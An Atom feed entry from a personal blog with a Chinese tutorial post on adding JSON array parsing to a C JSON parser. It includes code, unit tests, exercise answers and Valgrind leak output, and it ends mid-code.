<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AYu</title>
  
  
  <link href="https://www.fvolcano.red/atom.xml" rel="self"/>
  
  <link href="https://www.fvolcano.red/"/>
  <updated>2021-08-11T07:29:06.000Z</updated>
  <id>https://www.fvolcano.red/</id>
  
  <author>
    <name>AYu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>跟着做一个JSON解析器（五）</title>
    <link href="https://www.fvolcano.red/2021/Make-a-JSON-parser-5/"/>
    <id>https://www.fvolcano.red/2021/Make-a-JSON-parser-5/</id>
    <published>2021-08-11T07:29:06.000Z</published>
    <updated>2021-08-11T07:29:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>跟着github上的项目json-tutorial完成一个json解析器。本文对应该项目的第四单元，重点在解析\uXXXX类型的字符串。<a id="more"></a></p><p>👉<a href="https://github.com/miloyip/json-tutorial">原项目地址</a></p><h1 id="一、JSON数组"><a href="#一、JSON数组" class="headerlink" title="一、JSON数组"></a>一、JSON数组</h1><p>一个 JSON 数组可以包含零至多个元素，而这些元素也可以是数组类型。换句话说，我们可以表示嵌套（nested）的数据结构。先来看看 JSON 数组的语法：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> = <span class="meta">%x5B</span> ws [ <span class="keyword">value</span> *( ws <span class="meta">%x2C</span> ws <span class="keyword">value</span> ) ] ws <span class="meta">%x5D</span></span><br></pre></td></tr></table></figure><p>当中，<code>%x5B</code> 是左中括号 <code>[</code>，<code>%x2C</code> 是逗号 <code>,</code>，<code>%x5D</code> 是右中括号 <code>]</code> ，<code>ws</code> 是空白字符。一个数组可以包含零至多个值，以逗号分隔，例如 <code>[]</code>、<code>[1,2,true]</code>、<code>[[1,2],[3,4],&quot;abc&quot;]</code> 都是合法的数组。但注意 JSON 不接受末端额外的逗号，例如 <code>[1,2,]</code> 是不合法的（许多编程语言如 C/C++、Javascript、Java、C# 都容许数组初始值包含末端逗号）。</p><p>JSON 数组的语法很简单，实现的难点不在语法上，而是怎样管理内存。</p><h1 id="二、数据结构"><a href="#二、数据结构" class="headerlink" title="二、数据结构"></a>二、数据结构</h1><p>首先，我们需要设计存储 JSON 数组类型的数据结构。</p><p>JSON 数组存储零至多个元素，最简单就是使用 C 语言的数组。数组最大的好处是能以 O(1) 用索引访问任意元素，次要好处是内存布局紧凑，省内存之余还有高缓存一致性（cache coherence）。但数组的缺点是不能快速插入元素，而且我们在解析 JSON 数组的时候，还不知道应该分配多大的数组才合适。</p><p>另一个选择是链表（linked list），它的最大优点是可快速地插入元素（开端、末端或中间），但需要以 O(n) 时间去经索引取得内容。如果我们只需顺序遍历，那么是没有问题的。还有一个小缺点，就是相对数组而言，链表在存储每个元素时有额外内存开销（存储下一节点的指针），而且遍历时元素所在的内存可能不连续，令缓存不命中（cache miss）的机会上升。</p><p>我见过一些 JSON 库选择了链表，而这里则选择了数组。我们将会通过之前在解析字符串时实现的堆栈，来解决解析 JSON 数组时未知数组大小的问题。</p><p>决定之后，我们在 <code>lept_value</code> 的 <code>union</code> 中加入数组的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lept_value</span> <span class="title">lept_value</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lept_value</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> lept_value* e; <span class="keyword">size_t</span> size; &#125;a; <span class="comment">/* array */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="keyword">char</span>* s; <span class="keyword">size_t</span> len; &#125;s;</span><br><span class="line">        <span class="keyword">double</span> n;</span><br><span class="line">    &#125;u;</span><br><span class="line">    lept_type type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于 <code>lept_value</code> 内使用了自身类型的指针，我们必须前向声明（forward declare）此类型。</p><p>另外，注意这里 <code>size</code> 是元素的个数，不是字节单位。我们增加两个 API 去访问 JSON 数组类型的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">lept_get_array_size</span><span class="params">(<span class="keyword">const</span> lept_value* v)</span> </span>&#123;</span><br><span class="line">    assert(v != <span class="literal">NULL</span> &amp;&amp; v-&gt;type == LEPT_ARRAY);</span><br><span class="line">    <span class="keyword">return</span> v-&gt;u.a.size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">lept_value* <span class="title">lept_get_array_element</span><span class="params">(<span class="keyword">const</span> lept_value* v, <span class="keyword">size_t</span> index)</span> </span>&#123;</span><br><span class="line">    assert(v != <span class="literal">NULL</span> &amp;&amp; v-&gt;type == LEPT_ARRAY);</span><br><span class="line">    assert(index &lt; v-&gt;u.a.size);</span><br><span class="line">    <span class="keyword">return</span> &amp;v-&gt;u.a.e[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂时我们不考虑增删数组元素，这些功能留待第八单元讨论。</p><p>然后，我们写一个单元测试去试用这些 API（练习需要更多测试）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(_MSC_VER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ_SIZE_T(expect, actual) EXPECT_EQ_BASE((expect) == (actual), (size_t)expect, (size_t)actual, <span class="meta-string">&quot;%Iu&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ_SIZE_T(expect, actual) EXPECT_EQ_BASE((expect) == (actual), (size_t)expect, (size_t)actual, <span class="meta-string">&quot;%zu&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_array</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lept_value v;</span><br><span class="line"></span><br><span class="line">    lept_init(&amp;v);</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, <span class="string">&quot;[ ]&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_ARRAY, lept_get_type(&amp;v));</span><br><span class="line">    EXPECT_EQ_SIZE_T(<span class="number">0</span>, lept_get_array_size(&amp;v));</span><br><span class="line">    lept_free(&amp;v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在之前的单元中，作者已多次重申，C 语言的数组大小应该使用 <code>size_t</code> 类型。因为我们要验证 <code>lept_get_array_size()</code> 返回值是否正确，所以再为单元测试框架添加一个宏 <code>EXPECT_EQ_SIZE_T</code>。麻烦之处在于，ANSI C（C89）并没有的 <code>size_t</code> 打印方法，在 C99 则加入了 <code>&quot;%zu&quot;</code>，但 VS2015 中才有，之前的 VC 版本使用非标准的 <code>&quot;%Iu&quot;</code>。因此，上面的代码使用条件编译去区分 VC 和其他编译器。虽然这部分不跨平台也不是 ANSI C 标准，但它只在测试程序中，不太影响程序库的跨平台性。</p><h1 id="三、解析过程"><a href="#三、解析过程" class="headerlink" title="三、解析过程"></a>三、解析过程</h1><p>我们在解析 JSON 字符串时，因为在开始时不能知道字符串的长度，而又需要进行转义，所以需要一个临时缓冲区去存储解析后的结果。我们为此实现了一个动态增长的堆栈，可以不断压入字符，最后一次性把整个字符串弹出，复制至新分配的内存之中。</p><p>对于 JSON 数组，我们也可以用相同的方法，而且，我们可以用同一个堆栈！我们只需要把每个解析好的元素压入堆栈，解析到数组结束时，再一次性把所有元素弹出，复制至新分配的内存之中。</p><p>但和字符串有点不一样，如果把 JSON 当作一棵树的数据结构，JSON 字符串是叶节点，而 JSON 数组是中间节点。在叶节点的解析函数中，我们怎样使用那个堆栈也可以，只要最后还原就好了。但对于数组这样的中间节点，共用这个堆栈没问题么？</p><p>答案是：只要在解析函数结束时还原堆栈的状态，就没有问题。为了直观地了解这个解析过程，我们用连环图去展示 <code>[&quot;abc&quot;,[1,2],3]</code> 的解析过程。</p><p>首先，我们遇到 <code>[</code>，进入 <code>lept_parse_array()</code>：</p><p><a href="https://github.com/miloyip/json-tutorial/blob/master/tutorial05/images/parse_array01.png"><img src="/2021/Make-a-JSON-parser-5/parse_array01.png" alt=" "></a></p><p>生成一个临时的 <code>lept_value</code>，用于存储之后的元素。我们再调用 <code>lept_parse_value()</code> 去解析这个元素值，因为遇到 <code>&quot;</code> 进入 <code>lept_parse_string()</code>：</p><p><a href="https://github.com/miloyip/json-tutorial/blob/master/tutorial05/images/parse_array02.png"><img src="/2021/Make-a-JSON-parser-5/parse_array02.png" alt=" "></a></p><p>在 <code>lept_parse_string()</code> 中，不断解析字符直至遇到 <code>&quot;</code>，过程中把每个字符压栈：</p><p><a href="https://github.com/miloyip/json-tutorial/blob/master/tutorial05/images/parse_array03.png"><img src="https://github.com/miloyip/json-tutorial/raw/master/tutorial05/images/parse_array03.png" alt=" "></a></p><p>最后在 <code>lept_parse_string()</code> 中，把栈上 3 个字符弹出，分配内存，生成字符串值：</p><p><img src="/2021/Make-a-JSON-parser-5/parse_array04.png" alt=" "></p><p>返回上一层 <code>lept_parse_array()</code>，把临时元素压栈：</p><p><img src="/2021/Make-a-JSON-parser-5/parse_array05.png"></p><p>然后我们再遇到 <code>[</code>，进入另一个 <code>lept_parse_array()</code>。它发现第一个元素是数字类型，所认调用 <code>lept_parse_number()</code>，生成一个临时的元素值：</p><p><img src="https://github.com/miloyip/json-tutorial/raw/master/tutorial05/images/parse_array06.png"></p><p>之后把该临时的元素值压栈：</p><p><a href="https://github.com/miloyip/json-tutorial/blob/master/tutorial05/images/parse_array07.png"><img src="https://github.com/miloyip/json-tutorial/raw/master/tutorial05/images/parse_array07.png" alt=" "></a></p><p>接着再解析第二个元素。我们遇到了 <code>]</code>，从栈上弹出 2 个元素，分配内存，生成数组（虚线代表是连续的内存）：</p><p><a href="https://github.com/miloyip/json-tutorial/blob/master/tutorial05/images/parse_array08.png"><img src="/2021/Make-a-JSON-parser-5/parse_array08.png" alt=" "></a></p><p>那个数组是上层数组的元素，我们把它压栈。现时栈内已有两个元素，我们再继续解析下一个元素：</p><p><img src="/2021/Make-a-JSON-parser-5/parse_array09.png" alt=" "></p><p>最后，遇到了 <code>]</code>，可以弹出栈内 3 个元素，分配内存，生成数组：</p><p><img src="/2021/Make-a-JSON-parser-5/parse_array10.png"></p><h1 id="四、实现"><a href="#四、实现" class="headerlink" title="四、实现"></a>四、实现</h1><p>经过这个详细的图解，实现 <code>lept_parse_array()</code> 应该没有难度。以下是半制成品：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_value</span><span class="params">(lept_context* c, lept_value* v)</span></span>; <span class="comment">/* 前向声明 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_array</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    EXPECT(c, <span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (*c-&gt;json == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">        c-&gt;json++;</span><br><span class="line">        v-&gt;type = LEPT_ARRAY;</span><br><span class="line">        v-&gt;u.a.size = <span class="number">0</span>;</span><br><span class="line">        v-&gt;u.a.e = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        lept_value e;</span><br><span class="line">        lept_init(&amp;e);</span><br><span class="line">        <span class="keyword">if</span> ((ret = lept_parse_value(c, &amp;e)) != LEPT_PARSE_OK)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        <span class="built_in">memcpy</span>(lept_context_push(c, <span class="keyword">sizeof</span>(lept_value)), &amp;e, <span class="keyword">sizeof</span>(lept_value));</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">if</span> (*c-&gt;json == <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            c-&gt;json++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (*c-&gt;json == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">            c-&gt;json++;</span><br><span class="line">            v-&gt;type = LEPT_ARRAY;</span><br><span class="line">            v-&gt;u.a.size = size;</span><br><span class="line">            size *= <span class="keyword">sizeof</span>(lept_value);</span><br><span class="line">            <span class="built_in">memcpy</span>(v-&gt;u.a.e = (lept_value*)<span class="built_in">malloc</span>(size), lept_context_pop(c, size), size);</span><br><span class="line">            <span class="keyword">return</span> LEPT_PARSE_OK;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> LEPT_PARSE_MISS_COMMA_OR_SQUARE_BRACKET;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_value</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (*c-&gt;json) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:  <span class="keyword">return</span> lept_parse_array(c, v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单说明的话，就是在循环中建立一个临时值（<code>lept_value e</code>），然后调用 <code>lept_parse_value()</code> 去把元素解析至这个临时值，完成后把临时值压栈。当遇到 <code>]</code>，把栈内的元素弹出，分配内存，生成数组值。</p><p>注意到，<code>lept_parse_value()</code> 会调用 <code>lept_parse_array()</code>，而 <code>lept_parse_array()</code> 又会调用 <code>lept_parse_value()</code>，<u>这是互相引用，所以必须要加入函数前向声明</u>。</p><p>最后，我想告诉同学，实现这个函数时，我曾经制造一个不明显的 bug。这个函数有两个 <code>memcpy()</code>，第一个「似乎」是可以避免的，先压栈取得元素的指针，给 <code>lept_parse_value</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">/* bug! */</span></span><br><span class="line">    lept_value* e = lept_context_push(c, <span class="keyword">sizeof</span>(lept_value));</span><br><span class="line">    lept_init(e);</span><br><span class="line">    size++;</span><br><span class="line">    <span class="keyword">if</span> ((ret = lept_parse_value(c, e)) != LEPT_PARSE_OK)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种写法为什么会有 bug？这是第 5 条练习题。</p><h1 id="五、总结与练习答案"><a href="#五、总结与练习答案" class="headerlink" title="五、总结与练习答案"></a>五、总结与练习答案</h1><ol><li>编写 <code>test_parse_array()</code> 单元测试，解析以下 2 个 JSON。由于数组是复合的类型，不能使用一个宏去测试结果，请使用各个 API 检查解析后的内容。</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="literal">null</span> , <span class="literal">false</span> , <span class="literal">true</span> , <span class="number">123</span> , <span class="string">&quot;abc&quot;</span> ]</span><br><span class="line">[ [ ] , [ <span class="number">0</span> ] , [ <span class="number">0</span> , <span class="number">1</span> ] , [ <span class="number">0</span> , <span class="number">1</span> , <span class="number">2</span> ] ]</span><br></pre></td></tr></table></figure><p>这个练习纯粹为了熟习数组的访问 API。新增的第一个 JSON 只需平凡的检测。第二个 JSON 有特定模式，第 i 个子数组的长度为 i，每个子数组的第 j 个元素是数字值 j，所以可用两层 for 循环测试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_parse_array</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i, j;</span><br><span class="line">    lept_value v;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    lept_init(&amp;v);</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, <span class="string">&quot;[ null , false , true , 123 , \&quot;abc\&quot; ]&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_ARRAY, lept_get_type(&amp;v));</span><br><span class="line">    EXPECT_EQ_SIZE_T(<span class="number">5</span>, lept_get_array_size(&amp;v));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NULL,   lept_get_type(lept_get_array_element(&amp;v, <span class="number">0</span>)));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_FALSE,  lept_get_type(lept_get_array_element(&amp;v, <span class="number">1</span>)));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_TRUE,   lept_get_type(lept_get_array_element(&amp;v, <span class="number">2</span>)));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_NUMBER, lept_get_type(lept_get_array_element(&amp;v, <span class="number">3</span>)));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_STRING, lept_get_type(lept_get_array_element(&amp;v, <span class="number">4</span>)));</span><br><span class="line">    EXPECT_EQ_DOUBLE(<span class="number">123.0</span>, lept_get_number(lept_get_array_element(&amp;v, <span class="number">3</span>)));</span><br><span class="line">    EXPECT_EQ_STRING(<span class="string">&quot;abc&quot;</span>, lept_get_string(lept_get_array_element(&amp;v, <span class="number">4</span>)), lept_get_string_length(lept_get_array_element(&amp;v, <span class="number">4</span>)));</span><br><span class="line">    lept_free(&amp;v);</span><br><span class="line"></span><br><span class="line">    lept_init(&amp;v);</span><br><span class="line">    EXPECT_EQ_INT(LEPT_PARSE_OK, lept_parse(&amp;v, <span class="string">&quot;[ [ ] , [ 0 ] , [ 0 , 1 ] , [ 0 , 1 , 2 ] ]&quot;</span>));</span><br><span class="line">    EXPECT_EQ_INT(LEPT_ARRAY, lept_get_type(&amp;v));</span><br><span class="line">    EXPECT_EQ_SIZE_T(<span class="number">4</span>, lept_get_array_size(&amp;v));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        lept_value* a = lept_get_array_element(&amp;v, i);</span><br><span class="line">        EXPECT_EQ_INT(LEPT_ARRAY, lept_get_type(a));</span><br><span class="line">        EXPECT_EQ_SIZE_T(i, lept_get_array_size(a));</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            lept_value* e = lept_get_array_element(a, j);</span><br><span class="line">            EXPECT_EQ_INT(LEPT_NUMBER, lept_get_type(e));</span><br><span class="line">            EXPECT_EQ_DOUBLE((<span class="keyword">double</span>)j, lept_get_number(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    lept_free(&amp;v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>现时的测试结果应该是失败的，因为 <code>lept_parse_array()</code> 里没有处理空白字符，加进合适的 <code>lept_parse_whitespace()</code> 令测试通过。</li></ol><p>按现时的 <code>lept_parse_array()</code> 的编写方式，需要加入 3 个 <code>lept_parse_whitespace()</code> 调用，分别是解析 <code>[</code> 之后，元素之后，以及 <code>,</code> 之后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lept_parse_array</span><span class="params">(lept_context* c, lept_value* v)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    EXPECT(c, <span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">    lept_parse_whitespace(c);</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = lept_parse_value(c, &amp;e)) != LEPT_PARSE_OK)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        lept_parse_whitespace(c);</span><br><span class="line">        <span class="keyword">if</span> (*c-&gt;json == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            c-&gt;json++;</span><br><span class="line">            lept_parse_whitespace(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>使用<a href="https://github.com/miloyip/json-tutorial/blob/master/tutorial03_answer/tutorial03_answer.md">第三单元解答篇</a>介绍的检测内存泄漏工具，会发现测试中有内存泄漏。很明显在 <code>lept_parse_array()</code> 中使用到 <code>malloc()</code> 分配内存，但却没有对应的 <code>free()</code>。应该在哪里释放内存？修改代码，使工具不再检测到相关的内存泄漏。</li></ol><p>成功测试那 3 个 JSON 后，使用内存泄漏检测工具会发现 <code>lept_parse_array()</code> 用 <code>malloc()</code>分配的内存没有被释放：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">==<span class="number">154</span>== <span class="number">124</span> (<span class="number">120</span> direct, <span class="number">4</span> indirect) bytes <span class="keyword">in</span> <span class="number">1</span> blocks are definitely lost <span class="keyword">in</span> loss record <span class="number">2</span> of <span class="number">4</span></span><br><span class="line">==<span class="number">154</span>==    at <span class="number">0</span>x4C28C20: malloc (vg_replace_malloc.c:<span class="number">296</span>)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x409D82: lept_parse_array (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x409E91: lept_parse_value (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x409F14: lept_parse (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x405261: test_parse_array (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x408C72: test_parse (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x40916A: main (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>== </span><br><span class="line">==<span class="number">154</span>== <span class="number">240</span> (<span class="number">96</span> direct, <span class="number">144</span> indirect) bytes <span class="keyword">in</span> <span class="number">1</span> blocks are definitely lost <span class="keyword">in</span> loss record <span class="number">4</span> of <span class="number">4</span></span><br><span class="line">==<span class="number">154</span>==    at <span class="number">0</span>x4C28C20: malloc (vg_replace_malloc.c:<span class="number">296</span>)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x409D82: lept_parse_array (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x409E91: lept_parse_value (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x409F14: lept_parse (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x40582C: test_parse_array (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x408C72: test_parse (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br><span class="line">==<span class="number">154</span>==    by <span class="number">0</span>x40916A: main (<span class="keyword">in</span> <span class="regexp">/json-tutorial/</span>tutorial05<span class="regexp">/build/</span>leptjson_test)</span><br></pre></td></tr></table></figure><p>很明显，有 <code>malloc()</code> 就要有对应的 <code>free()</code>。正确的释放位置应该放置在 <code>lept_free()</code>，当值被释放时，该值拥有的内存也在那里释放。之前字符串的释放也是放在这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lept_free</span><span class="params">(lept_value* v)</span> </span>&#123;</span><br><span class="line">    assert(v != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (v-&gt;type == LEPT_STRING)</span><br><span class="line">        <span class="built_in">free</span>(v-&gt;u.s.s);</span><br><span class="line">    v-&gt;type = LEPT_NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但对于数组，我们应该先把数组内的元素通过递归调用 <code>lept_free()</code> 释放，然后才释放本身的 <code>v-&gt;u.a.e</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 